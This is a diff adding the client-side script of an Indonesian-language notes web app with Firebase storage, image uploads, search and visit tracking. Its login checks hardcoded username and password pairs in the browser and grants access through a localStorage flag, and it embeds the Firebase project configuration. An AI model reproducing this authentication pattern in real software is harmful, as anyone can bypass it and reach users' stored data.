+                particle.style.animationDelay = `-${Math.random() * 25}s`;
+                particle.style.width = `${size}px`; particle.style.height = `${size}px`;
+                container.appendChild(particle);
+            }
+        }
+        function setupPasswordToggle() {
+            const toggle = document.getElementById('togglePassword');
+            const pass = document.getElementById('password');
+            if (toggle && pass) toggle.addEventListener('click', () => {
+                const type = pass.getAttribute('type') === 'password' ? 'text' : 'password';
+                pass.setAttribute('type', type);
+                toggle.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+            });
+        }
+        function setupLogin() {
+            const loginForm = document.getElementById('loginForm');
+            const loginContainer = document.getElementById('loginContainer');
+            const mainApp = document.getElementById('mainApp');
+            if (!loginForm) return;
+            const isLoggedIn = localStorage.getItem('cryptoVaultLoggedIn') === 'true';
+            const savedUsername = localStorage.getItem('cryptoVaultUsername');
+            if (isLoggedIn && savedUsername) { showMainApp(savedUsername); return; }
+            const handleLogin = (e) => {
+                e?.preventDefault();
+                const username = document.getElementById('username').value.trim();
+                const password = document.getElementById('password').value.trim();
+                if (!username || !password) { showLoginError('Harap isi username dan password'); return; }
+                if ((username === 'Stev1' && password === 'Stev1') || (username === 'admin' && password === 'admin123')) {
+                    localStorage.setItem('cryptoVaultLoggedIn', 'true');
+                    localStorage.setItem('cryptoVaultUsername', username);
+                    showMainApp(username);
+                } else { showLoginError('Username atau password salah'); }
+            };
+            loginForm.addEventListener('submit', handleLogin);
+        }
+        function showMainApp(username) {
+            const loginContainer = document.getElementById('loginContainer');
+            const mainApp = document.getElementById('mainApp');
+            if (!loginContainer || !mainApp) return;
+            const headerTitle = document.querySelector('header h1');
+            if (headerTitle) {
+                const old = headerTitle.querySelector('.username-display');
+                if (old) old.remove();
+                const span = document.createElement('span');
+                span.className = 'username-display';
+                span.style.cssText = 'display:inline-block; margin-left:10px; font-size:0.8em; background:var(--crypto-bitcoin); color:white; padding:4px 10px; border-radius:20px; vertical-align:middle;';
+                span.innerHTML = `<i class="fas fa-user"></i> ${username}`;
+                headerTitle.appendChild(span);
+            }
+            loginContainer.style.opacity = '0';
+            loginContainer.style.transition = 'opacity 0.3s ease';
+            setTimeout(() => {
+                loginContainer.style.display = 'none';
+                mainApp.classList.add('active');
+                mainApp.style.animation = 'fadeIn 0.5s ease forwards';
+                initializeApp(); // init firebase
+            }, 300);
+        }
+        function showLoginError(message) {
+            let errorMsg = document.querySelector('.login-error');
+            if (!errorMsg) {
+                errorMsg = document.createElement('div');
+                errorMsg.className = 'login-error';
+                document.getElementById('loginForm')?.appendChild(errorMsg);
+            }
+            errorMsg.innerHTML = `<i class="fas fa-exclamation-triangle"></i> ${message}`;
+            setTimeout(() => { if (errorMsg.parentNode) errorMsg.remove(); }, 4000);
+        }
+        function setupLogout() {
+            document.getElementById('logoutBtn')?.addEventListener('click', () => {
+                if (window.confirm('Apakah Anda yakin ingin logout?')) {
+                    localStorage.removeItem('cryptoVaultLoggedIn');
+                    localStorage.removeItem('cryptoVaultUsername');
+                    location.reload();
+                }
+            });
+        }
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCoHVfht1xjv3JOKTDDo6NgoMx40UIU_JY",
+            authDomain: "work-5a38d.firebaseapp.com",
+            projectId: "work-5a38d",
+            storageBucket: "work-5a38d.firebasestorage.app",
+            messagingSenderId: "538143224263",
+            appId: "1:538143224263:web:8b26ad7c6e6acf72f0a9e2"
+        };
+
+        let app, db, storageInstance, notesCollection;
+        let cleanupFunctions = [];
+        let currentViewingNote = null;
+        let isEditing = false;
+        let selectedImageFile = null;
+        let currentImageURL = null;
+
+        // SEARCH: tambahkan variabel global
+        let allNotes = [];
+        let searchTerm = '';
+
+        // DOM elements
+        const noteTitleInput = document.getElementById('noteTitle');
+        const noteContentInput = document.getElementById('noteContent');
+        const noteImageInput = document.getElementById('noteImage');
+        const imagePreviewContainer = document.getElementById('imagePreviewContainer');
+        const imagePreview = document.getElementById('imagePreview');
+        const removeImageBtn = document.getElementById('removeImageBtn');
+        const saveBtn = document.getElementById('saveBtn');
+        const cancelEditBtn = document.getElementById('cancelEditBtn');
+        const clearFormBtn = document.getElementById('clearFormBtn');
+        const editingNoteIdInput = document.getElementById('editingNoteId');
+        const formTitle = document.getElementById('formTitle');
+        const formIcon = document.getElementById('formIcon');
+        const notesList = document.getElementById('notesList');
+        const notesCount = document.getElementById('notesCount');
+        const totalNotesElement = document.getElementById('totalNotes');
+        const activeUsersElement = document.getElementById('activeUsers');
+        const totalVisitsElement = document.getElementById('totalVisits');
+        const titleCharCount = document.getElementById('titleCharCount');
+        const contentCharCount = document.getElementById('contentCharCount');
+        const viewNoteModal = document.getElementById('viewNoteModal');
+        const modalNoteTitle = document.getElementById('modalNoteTitle');
+        const modalNoteContent = document.getElementById('modalNoteContent');
+        const modalCreatedAt = document.getElementById('modalCreatedAt');
+        const modalUpdatedAt = document.getElementById('modalUpdatedAt');
+        const modalNoteId = document.getElementById('modalNoteId');
+        const modalImageContainer = document.getElementById('modalImageContainer');
+        const modalImage = document.getElementById('modalImage');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        const closeModalBtn2 = document.getElementById('closeModalBtn2');
+        const copyModalBtn = document.getElementById('copyModalBtn');
+        const editFromModalBtn = document.getElementById('editFromModalBtn');
+        const toast = document.getElementById('toast');
+        const toastMessage = document.getElementById('toastMessage');
+
+        // SEARCH: elemen input
+        const searchInput = document.getElementById('searchInput');
+
+        function showToast(msg, type = 'success') {
+            if (!toast || !toastMessage) return;
+            toastMessage.textContent = msg;
+            toast.className = `toast ${type}`;
+            toast.classList.remove('hidden');
+            setTimeout(() => toast.classList.add('hidden'), 3000);
+        }
+        function updateCharCounts() {
+            if (titleCharCount) titleCharCount.textContent = noteTitleInput.value.length;
+            if (contentCharCount) contentCharCount.textContent = noteContentInput.value.length;
+        }
+        function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
+        function formatDate(ts) { if (!ts) return 'Tidak tersedia'; try { return new Intl.DateTimeFormat('id-ID', { day:'numeric', month:'long', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit' }).format(ts.toDate()); } catch { return 'Baru saja'; } }
+        function formatDateShort(ts) { if (!ts) return 'Baru saja'; try { const d = ts.toDate(); const now = new Date(); const mins = Math.floor((now-d)/60000); if (mins<1) return 'Baru saja'; if (mins<60) return mins+' menit lalu'; if (mins<1440) return Math.floor(mins/60)+' jam lalu'; return new Intl.DateTimeFormat('id-ID',{day:'numeric',month:'short'}).format(d); } catch { return 'Baru saja'; } }
+        function resetImageForm() {
+            noteImageInput.value = '';
+            selectedImageFile = null;
+            currentImageURL = null;
+            imagePreviewContainer.style.display = 'none';
+            imagePreview.src = '#';
+        }
+        function exitEditMode() {
+            isEditing = false;
+            editingNoteIdInput.value = '';
+            noteTitleInput.value = '';
+            noteContentInput.value = '';
+            formTitle.innerHTML = 'Tambah Catatan Baru';
+            formIcon.className = 'fas fa-plus-circle';
+            saveBtn.innerHTML = '<i class="fas fa-save"></i> Simpan Catatan';
+            cancelEditBtn.style.display = 'none';
+            updateCharCounts();
+            resetImageForm();
+        }
+        function enterEditMode(id, title, content, imageURL) {
+            isEditing = true;
+            editingNoteIdInput.value = id;
+            noteTitleInput.value = title;
+            noteContentInput.value = content;
+            currentImageURL = imageURL || null;
+            if (imageURL) {
+                imagePreview.src = imageURL;
+                imagePreviewContainer.style.display = 'block';
+            } else {
+                imagePreviewContainer.style.display = 'none';
+            }
+            selectedImageFile = null;
+            noteImageInput.value = '';
+            formTitle.innerHTML = 'Edit Catatan';
+            formIcon.className = 'fas fa-edit';
+            saveBtn.innerHTML = '<i class="fas fa-save"></i> Update Catatan';
+            cancelEditBtn.style.display = 'flex';
+            updateCharCounts();
+            noteTitleInput.focus();
+        }
+
+        async function loadFirebase() {
+            try {
+                const firebaseApp = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js");
+                const firebaseFirestore = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js");
+                const firebaseStorage = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js");
+                window.initializeFirebaseApp = firebaseApp.initializeApp;
+                window.getFirestore = firebaseFirestore.getFirestore;
+                window.collection = firebaseFirestore.collection;
+                window.addDoc = firebaseFirestore.addDoc;
+                window.onSnapshot = firebaseFirestore.onSnapshot;
+                window.deleteDoc = firebaseFirestore.deleteDoc;
+                window.doc = firebaseFirestore.doc;
+                window.serverTimestamp = firebaseFirestore.serverTimestamp;
+                window.query = firebaseFirestore.query;
+                window.orderBy = firebaseFirestore.orderBy;
+                window.increment = firebaseFirestore.increment;
+                window.updateDoc = firebaseFirestore.updateDoc;
+                window.getDoc = firebaseFirestore.getDoc;
+                window.setDoc = firebaseFirestore.setDoc;
+                window.getDocs = firebaseFirestore.getDocs;
+                // storage
+                window.getStorage = firebaseStorage.getStorage;
+                window.ref = firebaseStorage.ref;
+                window.uploadBytes = firebaseStorage.uploadBytes;
+                window.getDownloadURL = firebaseStorage.getDownloadURL;
+                window.deleteObject = firebaseStorage.deleteObject;
+                return true;
+            } catch (e) { console.error('Error loading Firebase', e); return false; }
+        }
+
+        async function saveNote() {
+            const title = noteTitleInput.value.trim();
+            const content = noteContentInput.value.trim();
+            if (!title) { showToast('Judul tidak boleh kosong', 'error'); noteTitleInput.focus(); return; }
+            if (!content) { showToast('Isi catatan tidak boleh kosong', 'error'); noteContentInput.focus(); return; }
+
+            const originalText = saveBtn.innerHTML;
+            saveBtn.disabled = true;
+            let imageURLToSave = currentImageURL;
+
+            if (selectedImageFile) {
+                try {
+                    saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Upload gambar...';
+                    const fileName = `images/${Date.now()}_${selectedImageFile.name.replace(/[^a-zA-Z0-9.]/g, '_')}`;
+                    const storageRef = ref(storageInstance, fileName);
+                    await uploadBytes(storageRef, selectedImageFile);
+                    imageURLToSave = await getDownloadURL(storageRef);
+                } catch (err) {
+                    console.error(err);
+                    showToast('Gagal upload gambar', 'error');
+                    saveBtn.innerHTML = originalText;
+                    saveBtn.disabled = false;
+                    return;
+                }
+            }
+
+            // 2. Hapus gambar lama jika diganti/dihapus (saat edit)
+            if (isEditing && editingNoteIdInput.value) {
+                const oldSnap = await getDoc(doc(db, "notes", editingNoteIdInput.value));
+                if (oldSnap.exists()) {
+                    const oldData = oldSnap.data();
+                    if (oldData.imageURL && oldData.imageURL !== imageURLToSave) {
+                        try {
+                            const oldRef = ref(storageInstance, oldData.imageURL);
+                            await deleteObject(oldRef);
+                        } catch (e) { console.warn('gagal hapus gambar lama', e); }
+                    }
+                }
+            }
+
+            // 3. Simpan ke Firestore
+            try {
+                saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ' + (isEditing ? 'Mengupdate...' : 'Menyimpan...');
+                const noteData = {
+                    title, content,
+                    updatedAt: serverTimestamp(),
+                    imageURL: imageURLToSave || null
+                };
+                if (isEditing && editingNoteIdInput.value) {
+                    await updateDoc(doc(db, "notes", editingNoteIdInput.value), noteData);
+                    showToast('Catatan diperbarui', 'success');
+                } else {
+                    noteData.createdAt = serverTimestamp();
+                    await addDoc(collection(db, "notes"), noteData);
+                    showToast('Catatan disimpan', 'success');
+                }
+                exitEditMode();
+                resetImageForm();
+            } catch (err) {
+                console.error(err);
+                showToast('Gagal simpan: ' + err.message, 'error');
+            } finally {
+                saveBtn.innerHTML = originalText;
+                saveBtn.disabled = false;
+            }
+        }
+
+        async function deleteNote(noteId) {
+            if (!confirm('Hapus catatan ini?')) return;
+            try {
+                const noteRef = doc(db, "notes", noteId);
+                const snap = await getDoc(noteRef);
+                if (snap.exists() && snap.data().imageURL) {
+                    try {
+                        const imgRef = ref(storageInstance, snap.data().imageURL);
+                        await deleteObject(imgRef);
+                    } catch (e) { console.warn('gagal hapus gambar', e); }
+                }
+                await deleteDoc(noteRef);
+                if (editingNoteIdInput.value === noteId) exitEditMode();
+                showToast('Catatan dihapus', 'success');
+            } catch (err) { showToast('Gagal hapus', 'error'); }
+        }
+
+        function viewNoteFull(note) {
+            currentViewingNote = note;
+            modalNoteTitle.textContent = note.title || 'Tanpa Judul';
+            modalNoteContent.textContent = note.content || '';
+            modalCreatedAt.textContent = note.createdAt ? formatDate(note.createdAt) : '-';
+            modalUpdatedAt.textContent = note.updatedAt ? formatDate(note.updatedAt) : '-';
+            modalNoteId.textContent = note.id;
+            if (note.imageURL) {
+                modalImage.src = note.imageURL;
+                modalImageContainer.style.display = 'block';
+            } else {
+                modalImageContainer.style.display = 'none';
+            }
+            viewNoteModal.classList.add('show');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            viewNoteModal.classList.remove('show');
+            currentViewingNote = null;
+            document.body.style.overflow = 'auto';
+        }
+
+        function filterNotes() {
+            if (!searchTerm.trim()) return allNotes;
+            const term = searchTerm.trim().toLowerCase();
+            return allNotes.filter(note => 
+                (note.title && note.title.toLowerCase().includes(term)) || 
+                (note.content && note.content.toLowerCase().includes(term))
+            );
+        }
+
+        function renderNotesList(notes) {
+            notesCount.textContent = notes.length + ' catatan';
+
+            if (notes.length === 0) {
+                if (allNotes.length === 0) {
+                    notesList.innerHTML = '<div class="empty-state"><i class="fas fa-clipboard"></i><h3>Belum ada catatan</h3><p>Tambahkan catatan pertama dengan form di atas.</p></div>';
+                } else {
+                    notesList.innerHTML = `<div class="empty-state"><i class="fas fa-search"></i><h3>Tidak ditemukan</h3><p>Tidak ada catatan yang cocok dengan pencarian "${escapeHtml(searchTerm)}".</p></div>`;
+                }
+                return;
+            }
+
+            notesList.innerHTML = '';
+            notes.forEach(note => {
+                const card = document.createElement('div');
+                card.className = 'note-card';
+                const isEdited = note.updatedAt && note.createdAt && note.updatedAt.toDate() > note.createdAt.toDate();
+                const dateInfo = isEdited ?
+                    `<div class="note-date" title="Diperbarui: ${formatDate(note.updatedAt)}"><i class="fas fa-edit"></i> ${formatDateShort(note.updatedAt)} <span style="margin-left:auto; font-size:0.7rem; color:var(--warning);"><i class="fas fa-pen"></i> diedit</span></div>` :
+                    `<div class="note-date" title="Dibuat: ${formatDate(note.createdAt)}"><i class="far fa-calendar"></i> ${formatDateShort(note.createdAt)}</div>`;
+
+                let imageHtml = '';
+                if (note.imageURL) {
+                    imageHtml = `<div style="margin:10px 0 10px 10px;"><img src="${escapeHtml(note.imageURL)}" alt="gambar" class="note-image-thumb" style="max-width:100%; max-height:100px; border-radius:6px; object-fit:cover;"></div>`;
+                }
+
+                card.innerHTML = `
+                    <h3 class="note-title">${escapeHtml(note.title || 'Tanpa Judul')}</h3>
+                    <div class="note-content">${escapeHtml((note.content || '').substring(0,120))}${(note.content||'').length>120?'...':''}</div>
+                    ${imageHtml}
+                    ${dateInfo}
+                    <div class="note-actions">
+                        <button class="btn btn-info view-btn" data-id="${note.id}"><i class="fas fa-eye"></i> Lihat</button>
+                        <button class="btn btn-warning edit-btn" data-id="${note.id}"><i class="fas fa-edit"></i> Edit</button>
+                        <button class="btn btn-danger delete-btn" data-id="${note.id}"><i class="far fa-trash-alt"></i> Hapus</button>
+                    </div>
+                `;
+                notesList.appendChild(card);
+            });
+
+            // Tambahkan event listeners
+            document.querySelectorAll('.delete-btn').forEach(b => b.addEventListener('click', (e) => { e.stopPropagation(); deleteNote(b.dataset.id); }));
+            document.querySelectorAll('.edit-btn').forEach(b => b.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const note = notes.find(n => n.id === b.dataset.id);
+                if (note) enterEditMode(note.id, note.title, note.content, note.imageURL);
+            }));
+            document.querySelectorAll('.view-btn').forEach(b => b.addEventListener('click', (e) => {
+                e.stopPropagation();
+                const note = notes.find(n => n.id === b.dataset.id);
+                if (note) viewNoteFull(note);
+            }));
+        }
+
+        function displayNotes() {
+            const q = query(collection(db, "notes"), orderBy("createdAt", "desc"));
+            const unsubscribe = onSnapshot(q, (snapshot) => {
+                const notes = [];
+                snapshot.forEach(d => notes.push({ id: d.id, ...d.data() }));
+                
+                // Update total notes stat (total semua catatan)
+                if (totalNotesElement) totalNotesElement.textContent = notes.length;
+                
+                // Simpan allNotes
+                allNotes = notes;
+                
+                // Render berdasarkan search term
+                renderNotesList(filterNotes());
+            }, (err) => {
+                console.error(err);
+                notesList.innerHTML = `<div class="error-state"><i class="fas fa-exclamation-triangle"></i><h3>Gagal memuat</h3><p>${err.message}</p></div>`;
+            });
+            cleanupFunctions.push(unsubscribe);
+        }
+
+        // Inisialisasi app
+        async function initializeApp() {
+            const loaded = await loadFirebase();
+            if (!loaded) { showToast('Gagal muat Firebase', 'error'); return; }
+            try {
+                app = initializeFirebaseApp(firebaseConfig);
+                db = getFirestore(app);
+                storageInstance = getStorage(app);
+                notesCollection = collection(db, "notes");
+
+                await trackVisit();
+                await trackActiveUsers();
+                displayNotes();
+
+                noteTitleInput?.addEventListener('input', updateCharCounts);
+                noteContentInput?.addEventListener('input', updateCharCounts);
+                saveBtn?.addEventListener('click', saveNote);
+                cancelEditBtn?.addEventListener('click', exitEditMode);
+                clearFormBtn?.addEventListener('click', () => {
+                    if (isEditing && confirm('Batalkan edit?')) exitEditMode();
+                    else { noteTitleInput.value = ''; noteContentInput.value = ''; resetImageForm(); updateCharCounts(); }
+                });
+
+                noteImageInput?.addEventListener('change', (e) => {
+                    const file = e.target.files[0];
+                    if (!file) { selectedImageFile = null; imagePreviewContainer.style.display = 'none'; return; }
+                    if (file.size > 5 * 1024 * 1024) {
+                        showToast('Maksimal 5MB', 'error');
+                        noteImageInput.value = '';
+                        return;
+                    }
+                    selectedImageFile = file;
+                    const reader = new FileReader();
+                    reader.onload = (ev) => { imagePreview.src = ev.target.result; imagePreviewContainer.style.display = 'block'; };
+                    reader.readAsDataURL(file);
+                });
+
+                removeImageBtn?.addEventListener('click', () => {
+                    noteImageInput.value = '';
+                    selectedImageFile = null;
+                    if (isEditing) currentImageURL = null;
+                    imagePreviewContainer.style.display = 'none';
+                });
+
+                closeModalBtn?.addEventListener('click', closeModal);
+                closeModalBtn2?.addEventListener('click', closeModal);
+                editFromModalBtn?.addEventListener('click', () => {
+                    if (currentViewingNote) {
+                        closeModal();
+                        enterEditMode(currentViewingNote.id, currentViewingNote.title, currentViewingNote.content, currentViewingNote.imageURL);
+                    }
+                });
+                copyModalBtn?.addEventListener('click', () => {
+                    if (currentViewingNote) {
+                        navigator.clipboard.writeText(currentViewingNote.content)
+                            .then(() => showToast('Teks tersalin', 'success'))
+                            .catch(() => showToast('Gagal menyalin', 'error'));
+                    }
+                });
+                viewNoteModal?.addEventListener('click', (e) => { if (e.target === viewNoteModal) closeModal(); });
+                document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && viewNoteModal?.classList.contains('show')) closeModal(); });
+
+                // SEARCH: event listener
+                if (searchInput) {
+                    searchInput.addEventListener('input', (e) => {
+                        searchTerm = e.target.value;
+                        renderNotesList(filterNotes());
+                    });
+                }
+
+                updateCharCounts();
+            } catch (err) { console.error('Init error', err); }
+        }
+
+        // Statistik
+        async function trackVisit() {
+            const visitsRef = doc(db, "stats", "visits");
+            await updateDoc(visitsRef, { count: increment(1), lastUpdated: serverTimestamp() }).catch(async () => await setDoc(visitsRef, { count: 1, lastUpdated: serverTimestamp() }));
+            onSnapshot(visitsRef, (d) => { if (d.exists() && totalVisitsElement) totalVisitsElement.textContent = d.data().count || 1; });
+        }
+        async function trackActiveUsers() {
+            const userId = localStorage.getItem('vault_userId') || 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2,9);
+            localStorage.setItem('vault_userId', userId);
+            const sessionRef = doc(db, "sessions", userId);
+            await setDoc(sessionRef, { userId, lastActive: serverTimestamp(), userAgent: navigator.userAgent.substring(0,200), online: true });
+            const interval = setInterval(async () => { try { await updateDoc(sessionRef, { lastActive: serverTimestamp() }); } catch { clearInterval(interval); } }, 30000);
+            const unsubscribe = onSnapshot(collection(db, "sessions"), (snap) => {
+                let active = 0; const now = new Date();
+                snap.docs.forEach(d => { if (d.data().lastActive) { const diff = (now - d.data().lastActive.toDate()) / 60000; if (diff < 2) active++; } });
+                if (activeUsersElement) activeUsersElement.textContent = Math.max(1, active);
+            });
+            const cleanup = async () => { clearInterval(interval); await updateDoc(sessionRef, { online: false, lastActive: serverTimestamp() }); unsubscribe(); };
+            window.addEventListener('beforeunload', cleanup);
+            window.addEventListener('pagehide', cleanup);
+            cleanupFunctions.push(cleanup);
+        }
+
+        // Bootstrap
+        document.addEventListener('DOMContentLoaded', () => {
+            generateCryptoParticles();
+            setupPasswordToggle();
+            setupLogin();
+            setupLogout();
+            window.addEventListener('resize', generateCryptoParticles);
+        });
+    </script>
 </body>
 </html>
-
